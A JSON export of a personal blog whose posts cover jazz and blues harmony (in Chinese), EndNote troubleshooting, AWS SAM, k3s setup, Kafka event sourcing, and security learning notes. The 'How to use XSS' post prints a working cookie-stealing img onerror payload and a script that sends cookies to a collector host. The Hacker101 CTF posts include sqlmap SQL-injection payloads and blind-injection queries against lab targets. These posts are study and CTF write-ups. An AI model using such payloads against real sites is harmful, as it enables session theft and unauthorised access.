[{"title":"ii-V-i进行的笔记","url":"/2021/01/01/[Jazz]-II-V-I进行/","content":"\n最近重新捡起我的aerophone了, 在YouTube上找到一个很不错的乐手能够教我们根练 (藤井泰宏). \n\n那么关于II-V-I, 有一个值得注意的是 II是小七和弦(2461) 记做D-7; V是属七和弦 (5724) 记做 (G7) I是大七和弦 (1357) 记Cmaj7, 差不多是在爵士中一个固定的模式, 也就是我们在调性频繁切换的时候, 根据和弦性质来判断级数. \n\n所以当我们在研究II和弦到V和弦再到I级和弦的时候, 我们要留意每个和弦的七音都向下解决一个小二度, 变为下一个和弦的三音. 这也是基本的voice leading. 声部进行是一个特定的方向的移动. 就好像七音被一种重力或者磁力吸引, 迫使她向下解决一个小二度. 比如我在吹奏的时候,在做即兴演奏, 但是另一个乐手在演奏主旋律, 那么我要奏出一个七音并向下解决一个小二度, 会马上为独奏者勾勒一条背景线条. 和古典音乐一样，爵士乐也强调7th的解决，这是七和弦的自然倾向。在声部进行中应该特别注意。\n\n我们google一下五度圈 然后就能够发现 逆时针进行的五度圈就是无限的II-V-I. 很有意思吧.\n\n#### 笔记一下其他和弦进行\n+ V级的V ：也就是古典中的重属和弦，但是不全解决。如 D7-G7, 但在乐队演奏中, 键盘通常用的无根音和弦, 也就是在乐队中将根音交给bass处理, 就让键盘的低音线条更加流畅. \n+ I-vi-ii-V：最常见的和弦进行，可以配无数首流行歌，不多提了。\n+ iii-vi-ii-V：一级换成了同功能的三级，顺便增加了进行到vi的倾向性，形成了4个连续的属到主进行。\n+ I-ii-iii-IV：多用于长音，如两小节都是I级和弦时，吉他和钢琴进行和声加花（I-ii-iii-IV-iii-ii-I）。\n+ I-IV：常用的一级到四级进行。","tags":["jazz"],"categories":["Music"]},{"title":"测试爵士乐理知识的题目","url":"/2020/11/01/[Jazz]-测试Jazz乐理/","content":"\n好难QAQ\n\n1. 用五线谱高音谱号写出: Amaj7, Eb+7, Bb7(#11) Db-(maj7), G#-7(b5)\n2. shell voicing 是哪些和弦音组合构成\n3. C大调的第七级上的mode是什么 (调式音阶)\n4. 在大调作为主（I 级），当遇到 7 和弦作为 V 级，又没有升降 9，11，13 的时候，V 级和弦上可以使用哪个 mode？\n5. G7#11 作为小调中的 V 级，相对应的 mode 是?\n6. Altered scale 正确的音阶排列：\n7. 小调中，V 级上面的 7 和弦，可以使用的音阶有：多个答案\n8. 小调中，V 级上面的 7 和弦，可以使用的 变化的 延伸音有: 多个答案\n9. 小调中，II 级上面的 min7 和弦，可以使用的音阶有：多个答案\n\n问答\n\n10. E 大调的 V 级和弦是：\n11. Bb 小调的 II 级和弦是：\n12. F# 大调的 II-V-I 分别是：\n13. B-7 是哪个大调的 II 级和弦？\n14. Eb7 是哪个大调的 V 级和弦？\n\n15. 在小调中，II 级和弦通常使用下面哪个？选择\n    + -7\n    + maj7\n    + 7\n    + -7b5\n16. 在小调中，V 级和弦可以使用下面哪几个？多个答案\n    - 7#13 \n    - -Maj.7 \n    - 7#11 \n    - 7b9 \n    - 7#9 \n17. C 小调的 V 级和弦是什么？\n18. 大调的 II 级和弦和小调的 II 级和弦，差别在于和弦中的哪个音？\n\n19. 用和弦功能写出下面给出的调的 II-V- I 和弦连接\n\n+ BbMajor\n+ Eb Minor\n+ F# Minor\n\n20. 写出 Bb Blues 的和弦功能\n\n21. 写出 walking bass line:\n\n```\nC7 | F7 | C7| G-7 C7 |\nF7 | C7 | C7| E-7(b5) A7 |\nD-7| G7 | E-7 A7| D-7 G7|\n```\n22. 写出G大调 ii V-i 的 4-note Voicing\n23. 写出音阶 Ab altered/ G# Phrygian Mode / B Locrian #2 / G# Lydian Dominant / Bb Blues / E Dorian Mode\n\n\n什么时候能够写出来, 我就去补个坑吧QAQ","tags":["jazz"],"categories":["Music"]},{"title":"EndNote Debug","url":"/2020/01/26/[Research]-endnote-debug/","content":"\nEndNote is a nice tool for reference manage. Here is some problem when I getting in to this new area. Some troubleshooting comes subsequently. \n\n1. `COM Cannot Edit Range X9`\n\nIt looks like the EndNote and conflict with Zotero and Mendeley Plugin. Just uninstall all Plugin in the start folder which located at: \n\n```\n~/Library/Group Containers/UBF8T346G9.Office/User Content/Startup/Word (i.e., the Library folder within your home directory). \n\nThe ~/Library folder is hidden by default, but you can open it from the Finder by holding down Option, clicking the Go menu, and selecting Library. You can also press Cmd-Shift-G in Finder and copy in the default location to navigate to that folder.\n\n```\nWord for 2016 and 2019 only.\n","tags":["research"],"categories":["debug"]},{"title":"Be careful about serverless - SAM","url":"/2019/07/20/be-careful-about-serverless-sam/","content":"\n## intro\nRecently I am doing some work related to serverless. I am working on a service developed with full AWS stack. We use cloudfront and S3 for our CDN and static storage. At most case, our service is executed call-as-we-need, but still with high-throughput. At the very first beginning, using AWS lambda and API Gateway seems a reasonable choice. Low cost, easy to maintain. And we got the previous SAM (serverless application model) experience. We using CloudFormation [Macro](https://docs.aws.amazon.com/zh_cn/AWSCloudFormation/latest/UserGuide/template-macros.html) to make template more easier to use, reduce the coding work. But the Macro is uncontrollable, we can not debug the Macro when we come up with trouble. \n\nHere comes the problem.\n\n## Bug with Dynamodb \nWe defined a certain number of DynamoDB table on the CloudFormation, and another CloudFormation stack the refer those content in the table. The official way is define some Output in the table template, the export those attributed (e.g. ARN) from DynamoDB. \n\nThe Stack will refer those content using ImportValue. However, after we update the stack add those Output, it will throw out internal error. \n\nWe send a ticket to AWS and the AWS engineer adjust our stack, which we only got only one DynamoDB to add Output. \n\nBut what about other DynamoDB table, we needs to add those ARN manually. That wasn't elegant. But it works. \n\n## But with API Gateway\nWhen we using API Gateway, we need to redeploy it again when we update the config. In Cloudformation, Deployment is needed for API Gateway. We did the same with Macros. It works will when we using Macros to auto create that resources and auto deploy. But when We were invoking lambda via the API Gateway created by Macros. We found out that the request wasn't even reach to the lambda. It just return 502 directly by API Gateway. d\n\nWe check the log and got the error: Premission error. It means that the API Gateway didn't have the premission to access the lambda. Then we trace the stack to the upper resource. It seems the API Gateway was trying to invoke a lambda which even wasn't create by our currecy stack. \n\nThen it might be Deployment was unavilable. We send a ticket and be told that it was a expected result. Because the LogicalID in the template wasn't changed, then it would not trigger the Deplyment. But still not good the change LogicalID when we auto deploy using Macros. \n\n## Grammer check\nThis may not be a bug but still shows us that SAM might not be  a good choice on production. Cloudformation owns a template verify tool, its only check the yaml and json grammer. But not for the AWS template grammer check. This may cause our developer write the wrong template few times. There is a AWS open source called `cfn-python-lint`. But that stuff did not works well or even actually not working. \n\n## Solution\nThat problems shows above might just be a unfriendly usage of Cloudformation. We are actually working on it. Like I thinks before, DynamoDB's lifecycle is different with lambda, we need to decouple those module. `Changeset` might be a recommendation. \n\nEverytime we publish a lambda, we are update the $LATEST version of lambda. The API is calling the latest version by default. That means the function code is dynamical. And the deployment is snapshot of restapi, its static. But I believed that AWS::Lambda::Version is constrained a particular lambda usage. then we reference that api in the particular version. \n\nThe Macro might be redundent for our exists workflow, we hope it can tidy up our ops stuff, but it working on the opposite. \n\nThe only way to verfiy the Cloudformation template is put our stack on a sandbox. But that was overcosting for time. A single deployment on cloudfront may cost over half-hours. Anyway, drop the Macro or use a more native way may helps us. \n\nAgain, it's necessay to split up our stack. The infra network layer, data layer and app needs to put on different stacks. ","tags":["serverless"],"categories":["Tech"]},{"title":"和弦级数的记忆","url":"/2019/04/01/和弦级数的记忆/","content":"\n在记忆的时候遇到了一些问题，这里转载和整理一下 \n\n> https://www.zhihu.com/question/21202184/answer/683953151 \n\n大调音阶有7个音，分别以它们为根音构建3和弦，和谐的只有6个，第7个构成的和弦因为太严肃不讨人喜欢基本被一脚踢开。所以我们可以简洁地讨论前边的6个和弦。\n\n| G | Am  | Bm  | C  | D | Em  |\n|---|-----|-----|----|---|-----|\n| A | Bm  | C#m | D  | E | F#m |\n| C | Dm  | Em  | F  | G | Am  |\n| D | Em  | F#m | G  | A | Bm  |\n| E | F#m | G#m | A  | B | C#m |\n| F | Gm  | Am  | Bb | C | Dm  |\n\n看看它们，总结出级数与和弦特点之间的规律：\n\n+ 大和弦\n+ 小和弦\n+ 小\n+ 大\n+ 大\n+ 小\n\n它们可以说是音乐中最重要的规律，所有的音乐，要么直接使用它们，要么跟它们相关，145大 236小，要牢牢记住。所有大调都是这个规律。很多书上用罗马数字来表示它们。\n\n要把它们当图案来记忆，非常整洁。想想，当你用横按和弦来弹奏，是不是就只有3个位置，简洁到极致时你弹整首歌就只需要在这3个位置上移来移去。尽管每个调的音不同，但级数规律是不变的，所以思考和弦进行时，把注意力放在数字上会更有优势。特别是转调的时候。\n\n转调只需要在指板其它位置上重复同样的数字图案。由第一个和弦决定是什么调。如果你在5品开始，你的所有和弦都是A调的，不需要考虑什么全全半全全全半、升这个音、降那个音。如果在7品开始，你就在弹奏B调的和弦，以此类推。如果你从6弦空弦开始，就是E调，在这个位置，一级和四级和弦就变成空弦和弦（想想前3品的E和弦和A和弦）。\n\n两个练习：你要不断往下移去练习不同的调。然后在不同调上练习相同的和弦进行，这就是转调练习。现在你一共拥有两个数字图案，也就是说一个调你可以在指板的两个不同位置弹奏出来。你可以从你的曲子里选取一个和弦进行，然后分别在两个位置上弹奏。很多吉他爱好者都被C调和G调惯坏了，这两个调几乎所有和弦都是空弦和弦，虽然好按，指法简单，但也丧失了横按和弦进行的简洁，更要命的是丧失了这种图案思维。我们现在需要做的当然不是发誓不用空弦和弦，空弦和弦非常好，没毛病，而是用数字图案的思维来弹奏空弦和弦。即当你弹奏开放和弦时，脑中要有相应横按和弦的思维图像。举G调的例，脑中形成6弦3品开始的G横按和弦（眼睛也可以相应盯着看，就像假动作），手却按出开放的G；脑中形成6弦5品的横按，你意识到它其实是个Am，然后按出开放的Am。只要你对6弦和5弦的音够熟悉就可以轻易做到，不要忘了在其它调上也这样练习。","tags":["jazz"],"categories":["Music"]},{"title":"和弦级数和blues入门-2","url":"/2019/03/23/和弦级数和blues入门-2/","content":"\n## Blues Rhythms\n\n我们需要了解和弦进行，当和弦改变的时候，怎样分配时间到每个和弦，什么方法。\n\nBlues节奏型有许多。最常见的是I-IV-V 12-bar。传统的12-bar blues一共有12和小节同时重复这12小节一遍又一遍。当然节奏会改变。举几个简单的例子, 最基础的12-bar blues:\n\n```\nI - I - I - I \nIV - IV - I - I \nV - IV - I -I\n```\n\n如果key是在C的话那就是\n```\nC - C - C - C\nF - F - C - C\nG - F - C - C\n```\n\n当然还有各种变种的blues最常见的就是IV和弦在第二行的时候加入一个V和弦变调，为了转换更加和谐。这是当你重复这一段riff的时候。所以就变成了:\n\n```\nI - IV - I - I\nIV - IV - I - I\nV - IV - I - V\n```\n\n如果是C调的话\n\n```\nC - F - C - C\nF - F - C - C \nG - F - C - G\n```\n\n另外的一个variation就是将II级minor和弦加在第九小节和第十小节，所以如果是C调的话：\n\n```\nC - F - C - C\nF - F - C - C\nDm - G - C - G\n```\n\n","tags":["jazz"],"categories":["Music"]},{"title":"和弦级数和blues入门-1","url":"/2019/03/20/和弦级数和blues入门-1/","content":"\n## intro\n\nJazz Theory看了几章，但是如果真的要练习的话。Jazz练习还是有点难度。很多都是从blues开始练习的，所以转变一下方向。比较blues更加偏流行一点。更加容易上手。\n\n当然也就是找一些教材和视频，然后自己学习了。趁现在有些时间。\n\n视频在youtube上很好找，我觉不要找那种everyone must know；top 10 之类的就好了。很多视频都让我有所长进。\n\n教材主要有一个叫`Blues Guitar with Steve Krenz`这个比较全面。还有一个`ultimate blues guitar cheat sheet`这个比较理论一些。\n\n\n## 和弦级数\n\n首先引入一下和弦级数吧。这些书都默认读者有扎实的乐理了。一个简单粗暴的图，仅用来参考。\n\n![记忆图](https://i.loli.net/2019/03/20/5c920d33c2b94.jpg)\n\n> 和弦的级数，其实就是和弦跟音在和弦所在调内音阶上的级数。\n\n同一个和弦，在不同的调内，其级数是不同的，比如C和弦，在C大调内就是一级和弦，在G大调内，就是4级和弦;在F调内，就是5级和弦。\n\n判断一个和弦，在某一个调内的级数，除了根据其根音在调内音阶的音级外，最主要的还要判断一下，这个和弦是不是“调内和弦” --- 即和弦的构成音都是在调内的正统音级。\n\n+ 比如D和弦对于C大调来说，就不是调内和弦，因为D和弦的三音#F，在C音阶上，是升四级，而非正四级。所以对于一个调的音阶，除了了解其每个正统音级上的乐音外，还要清楚的了解，在这个音级上可以构建什么样的和弦。\n\n+ 以自然大音阶为例，在音阶的第一、第四、第五自然音级上构建的三和弦，都是大三和弦，就是正三和弦；在第二，第四，第六自然音阶上构建的和弦都是小三和弦。最后在第七音级上构建的三和弦，则是个减三和弦。\n\n+ 同理，关于七和弦。在第一、第四音级上构建的七和弦，都是大大七和弦；第五音级上构建的七和弦是大小七和弦；在第二、第三、第六音级上构建的七和弦，都是小小七和弦；第七音级上构建的七和弦是半减七和弦。\n\n所以，当看到一个大三和弦的时候，如作为“调内和弦”，则它只可能出现在大调的一，四，五这三个音级上，如果它的根音出现在某调的其他音级上，则必然不是该调的调内和弦。\n\n对于大调而言，如果一个大三和弦的根音音名与调名一样，则它必然是该调一级和弦；如与调名成纯四度音程关系，则是四级和弦；纯五度则是五级和弦。\n\n小三和弦一样，看根音与调名之间音程关系。上方大二度就是二级，上方大三度就是三级，下方小三度就是六级。\n\n诸如此类\n\n## Getting Start Your Blues\n\n现在的各类教程和教材都已经是overwhelming了。没必要都用和参考，两个不同的教材和教程，已经足够。这就是对抗。就像GAN一样。adversarial我们的材料。同时我也需要记住，没有能够马上就是riff一段大师级的blues/jazz。slow and steady wins the race。 \n\n毕竟是业余时间来学习，只是现在正好时间充沛了一些。所以这些lessons只是一些临时的工具让我们发展我们的音感。\n\n\n","tags":["jazz"],"categories":["Music"]},{"title":"k3s-轻量级Kubernetes上手","url":"/2019/03/09/k3s-轻量级Kubernetes上手/","content":"\n## intro\n\nk3s已经发布了几天时间，趁着手头的Vultr优惠券还没有过期，正好可以开几台机器尝试一下这个很热门的新项目。\n\n这个项目是RancherLab所开发的，之前使用k8s和swarm的时候也用过不少rancher，对其很方便的图形化容器管理感到很惊艳。感觉rancher和k8s其实应该算是竞争关系。rancher的两个版本都提供容器编排和调度，但是k8s的社区发展的越来越强大，rancher慢慢变成算是提供k8s的上层服务了，通过rancher管理多个k8s。\n\n好了vultr上的机器开好了，使用Ubuntu 18.04 x64 的快照，之前预装了docker之类的工具。虽然开了三台机器，不过首先还是试试单机的k3s吧。\n\n通过github的项目repo找到Readme先了解一下：https://github.com/rancher/k3s\n\n## Quick Start\n\nk3s已经使用了containerd替换Docker来做runtime，所以我们可以在RancherOS停止Docker。containerd本身就是Docker的一部分，完全兼容我们所熟悉的Docker。\n\n官网提供了两种方法，一种就是下载下载repo的release然后自行安装\n```\ncd /opt && wget https://github.com/rancher/k3s/releases/download/v0.2.0/k3s\nchmod +x k3s && ./k3s server &\n```\n另外一种是通过类似于getdocker之类的官方脚本\n\n```\ncurl -sfL https://get.k3s.io | sh -\n```\n我们试试第二种\n```\n[INFO]  Finding latest release\n[INFO]  Using v0.2.0 as release\n[INFO]  Downloading hash https://github.com/rancher/k3s/releases/download/v0.2.0/sha256sum-amd64.txt\n[INFO]  Downloading binary https://github.com/rancher/k3s/releases/download/v0.2.0/k3s\n[INFO]  Verifying binary download\n[INFO]  Installing k3s to /usr/local/bin/k3s\n[INFO]  Creating /usr/local/bin/kubectl symlink to k3s\n[INFO]  Creating /usr/local/bin/crictl symlink to k3s\n[INFO]  Creating uninstall script /usr/local/bin/k3s-uninstall.sh\n[INFO]  systemd: Creating environment file /etc/systemd/system/k3s.service.env\n[INFO]  systemd: Creating service file /etc/systemd/system/k3s.service\n[INFO]  systemd: Enabling k3s unit\nCreated symlink /etc/systemd/system/multi-user.target.wants/k3s.service → /etc/systemd/system/k3s.service.\n[INFO]  systemd: Starting k3s\n```\n当起了k3s之后检查一下`netstat -tnlp`，我们可以发现k3s一并起了多个端口6444/6445应该是主程序，因为再起一次会提示端口占用，还有10010的containerd，以及10248到10252等几个未知服务。\n\n之前网上搜一搜k3s的信息，发现都是起亚k3s的车[lol]。\n\n这样启动的k3s会自带agent，也就是kubernetes的节点，使用`k3s server --disable-agent`来起k3s就可以单纯的将其作为server。\n\n接下来尝试一下添加deployment。\n\n我们使用官方提供的yaml template\n\n```\nk3s kubectl create -f https://kubernetes.io/docs/user-guide/nginx-deployment.yaml\n```\n\n通过`k3s kubectl get deployment`和`k3s kubectl get pods`查看创建的pods\n\n\n## node\n如果我们需要添加agent呢，添加一个node？\n\n首先查看一下原来的node`k3s kubectl get node`拿到的是\n\n```\nNAME          STATUS   ROLES    AGE   VERSION\nvultr.guest   Ready    <none>   11d   v1.13.4-k3s.1\n```\n\n然后需要拿到机器上的node token，位置在`/var/lib/rancher/k3s/server/node-token`\n\n拿到之后使用，来加入node。\n\n```\nk3s agent -s ${YOUR_SERVER_IP} -t ${NODE_TOKEN}\n```\n\n但是发现一个问题，vultr的机器是默认没有开通LAN的或者是硬件配有配置好。\n\n比如这里用的是ubuntu的机器，我们需要自己添加LAN的固件。ubuntu 18的网卡配置需要创建一个10-ens7.yaml的文件在`/etc/netplan/`的目录下\n```\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens7:\n       match:\n         macaddress: 56:00:01:f2:8e:fb\n       mtu: 1450\n       dhcp4: no\n       addresses: [10.8.96.4/16]\n```\n\n其中addresses，就是vultr提供的private netowrk地址，使用`netplan apply`来配置设置。\n\n配置之后可以试一试能不能够ping通关联的机器。也可能需要重启类配置。\n\n这样多节点的k3s部署好了，就像swarm一样方便感觉。之后再尝试部署一些复杂的应用吧。\n\n### Reference \n\n+ https://github.com/rancher/k3s\n","tags":["Kubernetes"],"categories":["Tech"]},{"title":"Using Kafka as a Event Store","url":"/2019/02/10/Using-Kafka-as-a-Event-Store/","content":"Kafka is meant to be a messaging system which has many similarities to an event store however to quote their intro:\n\n> The Kafka cluster retains all published messages—whether or not they\n> have been consumed—**for a configurable period of time**. For example if\n> the retention is set for two days, then for the two days after a\n> message is published it is available for consumption, after which it\n> will be discarded to free up space. Kafka's performance is effectively\n> constant with respect to data size so retaining lots of data is not a\n> problem.\n\nSo while messages can potentially be retained indefinitely, the expectation is that they will be deleted. This doesn't mean you can't use this as an event store, but it may be better to use something else. Take a look at [EventStore][1] for an alternative.\n\n[Kafka documentation](http://kafka.apache.org/documentation.html):\n\n> Event sourcing is a style of application design where state changes are logged as a time-ordered sequence of records. Kafka's support for very large stored log data makes it an excellent backend for an application built in this style.\n\nOne concern with using Kafka for event sourcing is the number of required topics. Typically in event sourcing, there is a stream (topic) of events per entity (such as user, product, etc). This way, the current state of an entity can be reconstituted by re-applying all events in the stream. Each Kafka topic consists of one or more partitions and each partition is stored as a directory on the file system. There will also be pressure from ZooKeeper as the number of znodes increases.\n\nOther things that we should notice are:\n\n - Kafka only guarantees at least once deliver and there are duplicates\n   in the event store that cannot be removed. \n   Here you can read why it is so hard with Kafka and some latest news about how to finally achieve this behavior: https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/\n - Due to immutability, there is no way to manipulate event store when application evolves and events need to be transformed (there are of course methods like upcasting, but...). Once might say you never need to transform events, but that is not correct assumption, there could be situation where you do backup of original, but you upgrade them to latest versions. That is valid requirement in event driven architectures.\n - No place to persist snapshots of entities/aggregates and replay will become slower and slower. Creating snapshots is must feature for event store from long term perspective. \n - Given Kafka partitions are distributed and they are hard to manage and\n   backup compare with databases. Databases are simply simpler\n\nSo, before you make your choice you think twice. Event store as combination of application layer interfaces (monitoring and management), SQL/NoSQL store and Kafka as broker is better choice than leaving Kafka handle both roles to create complete feature full solution.\n\nEvent store is complex service which requires more than what Kafka can offer if you are serious about applying Event sourcing, CQRS, Sagas and other patterns in event driven architecture and stay high performance.\n\nPlease look at eventuate.io microservices open source framework to discover more about the potential problems: http://eventuate.io/\n\n### Back to Topic\n- Using Kafka as a event soursing? Yes or No, depending on your event sourcing usage.\n- It can be used in downstream event processors\nIn this kind of system, events happen in the real world and are recorded as facts. Such as a warehouse system to keep track of pallets of products. There are basically no conflicting events. Everything has already happened, even if it was wrong. (I.e. pallet 123456 put on truck A, but was scheduled for truck B.) Then later the facts are checked for exceptions via reporting mechanisms. Kafka seems well-suited for this kind of down-stream, event processing application.\n\nIn this context, it is understandable why Kafka folks are advocating it as an Event Sourcing solution. Because it is quite similar to how it is already used in, for example, click streams. However, people using the term Event Sourcing (as opposed to Stream Processing) are likely referring to the second usage...\n- It CANNOT be used in Application-controlled source of truth\n\nThis kind of application declares its own events as a result of user requests passing through business logic. Kafka does not work well in this case for two primary reasons.\n+ Lack of entity isolation\n\nThis scenario needs the ability to load the event stream for a specific entity. The common reason for this is to build a transient write model for the business logic to use to process the request. Doing this is impractical in Kafka. Using topic-per-entity could allow this, except this is a non-starter when there may be thousands or millions of that entity. This is due to technical limits in Kafka/Zookeeper. Using topic-per-type is recommended instead for Kafka, but this would require loading events for every entity of that type just to get events for a single entity. Since you cannot tell by log position which events belong to which entity. Even using Snapshots to start from a known log position, this could be a significant number of events to churn through. But snapshots cannot help you with code changes. Because adding new features to the business logic may render previous snapshots structurally incompatible. So it is still necessary to do a topic replay in those cases to build a new model. One of the main reasons to use a transient write model instead of a persisted one is to make business logic changes cheap and easy to deploy.\n\n+ Lack of conflict detection\n\nSecondly, users can create race conditions due to concurrent requests against the same entity. It may be quite undesirable to save conflicting events and resolve them after the fact. So it is important to be able to prevent conflicting events. To scale request load, it is common to use stateless services while preventing write conflicts using conditional writes (only write if the last entity event was #x). A.k.a. Optimistic Concurrency. Kafka does not support optimistic concurrency. Even if it supported it at the topic level, it would need to be all the way down to the entity level to be effective. To use Kafka and prevent conflicting events, you would need to use a stateful, serialized writer at the application level. This is a significant architectural requirement/restriction.\n\n  [1]: http://geteventstore.com/","tags":["distributed System"],"categories":["Tech"]},{"title":"How to use XSS","url":"/2018/12/17/[hack]-XSS/","content":"\nAfter following the hack101 video tutorial for a while. I want to write some note about XSS. \n\n## What is XSS\n\nXSS(Cross Site Scripting) is the mix abbreviation for Cascading Style Sheets, CSS. Though it seems out of date at the moment. But to some beginner just like me, it's a good way to experience the fun of looking bugs. \n\n## XSS detecting\nPeople can deploy a DVWA as a dev environment for testing the XSS.\n\nAt the lowest security level of DVWA, the client owns no filter to any users input. It means, input is the output. \n\nThe simplest XSS detecting is the `alert(1)`. Whether create a div or inject a `<script>alert(1)</script>`, the things we focus on is compile the code. \n\n## How hacker use XSS\nSometimes, when the security developer found that bug, he will terminate the XSS, that is one of his duty. But as a cursorily, he needs to use those bug to find why a way to hackin the inside. \nIf the website exists XSS loophole, then it must be able to run the js code.\n\ne.g. we can get the cookies on the page by enter alert(document.cookie). But most of time, hacker don't just inject a snippet of code, since it is no reason to use their own cookie. But they can send the cookies to a platform. Like XSSer, receive the XSS from all over the world. \n\nWhen xsser has done, hacker can insert the script into page like this: \n\n```\n<img   onerror=\"s=createElement('script');body.appendChild(s);s.src='http://192.168.1.103/xss/SMA9ST';\" src=\"x\">\n```\n\nThis is a img tag, the src is point to `x`. Obviously, this address is not exists. So it will run `onerror`. This function will generate a script tag, then point the new script tag to the xsser platform, which we builded before. Once the code request to the xsser. It will get the code, e.g.\n\n```\n(function() {\n\t\t(new Image()).src = 'http://192.168.1.103/xss/index.php?do=api&id=SMA9ST&location=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn document.location.href\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&toplocation=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn top.location.href\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&cookie=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn document.cookie\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})()) + '&opener=' + escape((function() {\n\t\t\ttry {\n\t\t\t\treturn (window.opener && window.opener.location.href) ? window.opener.location.href : ''\n\t\t\t} catch (e) {\n\t\t\t\treturn ''\n\t\t\t}\n\t\t})());\n\t})();\n```\n\nIn this code snippet, it also generate a image object and request a xsser project. Than we got the location information and cookies. \n\nEverytime when people open XSS page, the browser will run that kind of code, it mask as a image to send data to xsser.\n\nThat is the simple usage of XSS.\n\n","tags":["security"],"categories":["Hack"]},{"title":"Hacker101 CTF-3","url":"/2018/12/13/[hack]-hacker101-2/","content":"\n这一个CMS加入了需要登录的信息。在进行创建和编辑的时候需要用户名。首先就想到了一些无脑的用户名，admin之类的。试了一下，觉得不应该是这么简单。\n\n初步判断应该也是从SQL里面查取，所以尝试一下用`'`来注入。看看得到什么结果。\n\n```\nTraceback (most recent call last):\n  File \"./main.py\", line 145, in do_login\n    if cur.execute('SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')) == 0:\n  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py\", line 255, in execute\n    self.errorhandler(self, exc, value)\n  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py\", line 50, in defaulterrorhandler\n    raise errorvalue\nProgrammingError: (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1\")\n```\n\n意思是说我们在用MySQL数据库；使用的python2.7的main.py里面的do_login()查数据。查询命令就是`'SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')`\n\n这个后面的%%可能就是过滤一些东西的，之后再看看。\n\n我们用Sqlmap看看能不能够绕过这个表格POST。\n\n```\n python2.7 sqlmap.py -u http://35.196.135.216:5001/2f6fc5c078/login --data \"username=&password=\" --dbms mysql\n```\n\n然后得到的这个结果\n\n```\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\n    Payload: username=' OR NOT 1504=1504#&password=\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: username=' AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&password=\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind\n    Payload: username=' OR SLEEP(5)-- UXmq&password=\n```\n\n比如我们这个样注入一条`' or 1=1#`，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个`1=1`的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。\n\n这里引入一下[Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection) 来寻找有效的数据库的值。\n\n定一个查询函数使用`LIKE`，我们就可以匹配有效的密码。\n\n```\n'SELECT password FROM admins WHERE username=' ' or password LIKE \"%x\"#\n```\n`%`在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:\n\n```\n'SELECT password FROM admins WHERE username=' ' or password LIKE \"%%x\"#\n```\n\n目前卡在这里了，后续更新。","tags":["hacker101"],"categories":["Hack"]},{"title":"Hacker101 CTF-1/2","url":"/2018/12/12/[hack]-hacker101-1/","content":"I caught a nice website for learning basic information security recently. Hacker101. That site offers video course for novice to learn cryptography and information security from scratch. Also it has insteresting ctf question for us to solve. \n\nSo I gonna record my journey to the flag. Let's start from the simplest one. \n\n## CTF - 1 \n\nCTF - 1 Looks pretty simple, it gives a website and we can just inspect its source. Than we found it request a \"background.png\" as background. It seems weird when something called a resource from local directly. but we can check it our on the frontend.\n\nWe enter the `background.png` at the end of the address of website. Then we got the answer no surprisingly. \n\n## CTF - 2\n\nThis question shows us a mini CMS website. IT offers a simple management page to view and edit the page we created. And it use Markdown to help us formating the doc that we writed. \n\nWhen we are creating a page, we need edit two post form to fulfill the `POST` method to the server. There must be something hidden in it. Like what if we can write a scripts to inject some code on the front page to help us show the request information? \n\n### Flag 1\n\nWe input this code on the title bar. it ends the last tag and inject a scripts tag on the next line by `>`:\n```\n><scripts>alert(\"documents.cookies\")</scripts>\n```\nAlso we input `alert(\"documents.cookies\")` stright into the content form. \n\nThen we got our first flag. The hint shows us:\n\n+ Sometimes a given input will affect more than one page\n+ The bug you are looking for doesn't exist in the most obvious place this input is shown\n\n### Flag 2\n\nNow that we can control the page from the script code that we inject, maybe the source page could hide the flag like the CTF-1 shows. \n\nwe should add some tag, like img tag or button tag, into the contant form. \n\n```\n<img src='xxxxx'>\n```\n\nOpen the page, check the source page. The flag is right on here. Maybe we should know more about the XSS. \n\n### Flag 3\n\nThe flag 3 is actually a little bit tricky. I just don't know why it can cause a bug or some thing. To be honest, I have to check few more hint to get the flag. \n\nHere is the hint:\n+ Make sure you tamper with every input\n+ Have you tested for the usual culprits? XSS, SQL injection, path injection\n+ Bugs often occur when an input should always be one type and turns out to be another\n+ Remember, form submissions aren't the only inputs that come from browsers\n\nWe noticed that the address bar shows index to query the page form the server. May those index could exist inject. Like we can add a symbol on the end of address. e.g. `'`\n\nThan we got the flag, but that bug only exists in edit page. \n\n### Flag 4\n\nThe final bug also relate to the index, but this time we should focus how the website arrange the index for searching. When we create a new page, the index starts from 10, rather than 0. \n\nBut when we check the init page, test page and another stuff, we got the 0 and 1 index. So where are those page which index between 2 and 9? We input those index at the end of address page line. One by one, everytime we enter, we got the 404, until the 5th page. It shows `forbidden`. \n\nThat's weird. There must be something hidden in it. Why we just mock the trick used before, try create page or edit page. \n\nWe forcely enter the edit page with index 5. that the flag just lie down the content form. 